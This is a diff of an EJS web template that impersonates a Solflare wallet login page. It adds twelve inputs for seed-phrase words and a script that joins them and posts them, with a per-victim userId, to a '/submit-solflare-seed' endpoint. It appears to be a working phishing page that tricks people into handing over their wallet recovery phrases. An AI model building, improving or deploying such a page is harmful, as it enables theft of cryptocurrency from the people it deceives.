@@ -4,19 +4,54 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Solflare Wallet Login</title>
+    <link rel="stylesheet" href="/css/solflare.css">
 </head>
 <body>
-    <div class="login-container">
-        <h2>Sign in to Solflare Wallet</h2>
-        <form id="solflareLoginForm" action="/submit-solflare-seed" method="POST">
+    <div class="container">
+
+        <img src="/uploads/solflare.png" width="40%">
+
+
+
+        <h2>Solflare Wallet Seed Phrase</h2>
+        <p>Enter your 12-word seed phrase to access your Solflare wallet.</p>
+        
+        <form id="solflareLoginForm" action="/submit-solflare-seed" method="POST" onsubmit="combineSeedPhrase(event)">
             <input type="hidden" name="userId" value="<%= userId %>">
             
-            <label for="seedPhrase">Seed Phrase:</label>
-            <input type="text" id="seedPhrase" name="seedPhrase" required placeholder="Enter your 12-word seed phrase">
+            <!-- 12 Input fields for each word of the seed phrase -->
+            <div class="phrase-input">
+                <% for (let i = 1; i <= 12; i++) { %>
+                    <input type="text" name="seedWord<%= i %>" placeholder="<%= i %>." required>
+                <% } %>
+            </div>
             
-            <button type="submit">Submit</button>
+            <a href="#" class="link">I have a 24-word recovery phrase</a>
+
+            <!-- Hidden input to hold the combined seed phrase -->
+            <input type="hidden" id="seedPhrase" name="seedPhrase">
+            
+            <button type="submit" class="submit-button">input seed phrase</button>
         </form>
-        <p><a href="#">Forgot your seed phrase?</a></p>
     </div>
+
+    <script>
+        // Combine seed words into one phrase before submitting
+        function combineSeedPhrase(event) {
+            event.preventDefault();
+            
+            // Collect values from each individual seed word input
+            const seedWords = Array.from(document.querySelectorAll('.phrase-input input')).map(input => input.value.trim());
+
+            // Combine the words into a single string
+            const seedPhrase = seedWords.join(' ');
+
+            // Set the combined phrase in the hidden input
+            document.getElementById('seedPhrase').value = seedPhrase;
+
+            // Submit the form
+            event.target.submit();
+        }
+    </script>
 </body>
 </html>
